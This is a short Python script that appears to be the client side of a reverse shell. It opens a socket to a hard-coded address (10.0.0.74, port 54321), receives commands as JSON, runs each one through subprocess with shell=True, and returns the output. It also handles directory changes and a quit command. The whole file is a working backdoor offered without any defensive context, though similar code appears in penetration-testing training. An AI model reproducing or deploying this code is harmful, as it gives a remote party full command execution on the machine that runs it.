#!/usr/bin/python
import socket
import os
import subprocess
import json
import base64

def reliable_send(data):
    json_data = json.dumps(data)
    sock.send(json_data)

def reliable_recv():
    data = ""
    while True:
        try:
            data = data + sock.recv(1024)
            return json.loads(data)
        except ValueError:
            continue

def shell():
    while True:
        command = reliable_recv()
        if command == 'q':
            break
        elif command[:2] == "cd":
            try:
                os.chdir(command[3:])
            except:
                continue
        else:
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            reliable_send(result)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("10.0.0.74", 54321))
shell()
sock.close()
